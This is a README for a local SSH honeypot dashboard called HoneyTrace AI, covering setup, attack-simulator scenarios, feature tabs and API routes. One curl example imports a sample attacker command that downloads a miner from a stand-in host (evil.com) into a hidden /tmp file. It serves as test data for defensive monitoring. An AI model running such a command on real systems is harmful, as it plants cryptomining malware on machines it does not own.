# HoneyTrace AI — SSH Threat Monitor

A professional honeypot analysis dashboard that shows exactly what hackers do the moment they attack.

## Quick Start

```bash
unzip honeytrace-ai.zip
cd honeytrace-ai
node server.js
```

Open **http://127.0.0.1:3000**

If port 3000 is taken:
```bash
PORT=3001 node server.js
```

## Attack from Terminal

Full attack simulation:
```bash
node scripts/attack-simulator.js --scenario full
```

Specific scenarios:
```bash
node scripts/attack-simulator.js --scenario bruteforce --country China --ip 121.18.238.12
node scripts/attack-simulator.js --scenario crypto     --country Netherlands
node scripts/attack-simulator.js --scenario recon      --country Germany
node scripts/attack-simulator.js --scenario dropper    --country Russia
```

Single Cowrie event via curl:
```bash
curl -X POST http://127.0.0.1:3000/api/import/cowrie \
  -H "Content-Type: application/json" \
  -d '{"eventid":"cowrie.command.input","src_ip":"1.2.3.4","username":"root","input":"wget http://evil.com/miner -O /tmp/.x"}'
```

## Features

| Tab | What it shows |
|---|---|
| Overview | Stats, timeline, top attackers, top MITRE techniques |
| Live Feed | SOC-style real-time event stream |
| World Map | Clickable map — click any country for plain-English attack summary |
| Alerts | Incident triage with acknowledge button + acknowledged history |
| Attackers | Leaderboard with clickable cards — profile, session replay, command analysis |
| Kill Chain | ATT&CK phases observed in attacks |
| MITRE ATT&CK | Bar chart + heatmap + tactic matrix |
| IOCs | Extracted URLs, IPs, domains, file paths |
| Blocked IPs | Block/unblock attackers (persists across restarts) |
| Events | Raw event table |
| Import | Paste Cowrie JSONL or use terminal simulator |

## Scripts

```bash
node server.js                          # start server
node scripts/test.js                    # run 9 tests
node scripts/export-report.js          # save Markdown report
node scripts/attack-simulator.js       # simulate attacks from terminal
```

## API

| Method | Route | Description |
|---|---|---|
| GET | /api/summary | Dashboard metrics |
| GET | /api/attackers | All profiles |
| GET | /api/attackers/:ip | Single profile |
| GET | /api/attackers/:ip/analysis | AI analysis |
| GET | /api/attackers/:ip/session | Session replay |
| GET | /api/alerts | Alert triage |
| GET | /api/iocs | Extracted IOCs |
| GET | /api/geo | Geo attack data |
| GET | /api/killchain | Kill chain |
| GET | /api/livefeed | Live event feed |
| GET | /api/blocked | Blocked IPs |
| GET | /api/report | Markdown report |
| GET | /api/export/csv | CSV download |
| POST | /api/simulate | Add demo events |
| POST | /api/import/cowrie | Import JSONL |
| POST | /api/reset | Restore seed data |
| POST | /api/block/:ip | Block an IP |
| DELETE | /api/block/:ip | Unblock an IP |
| PATCH | /api/alerts/:id/ack | Acknowledge alert |
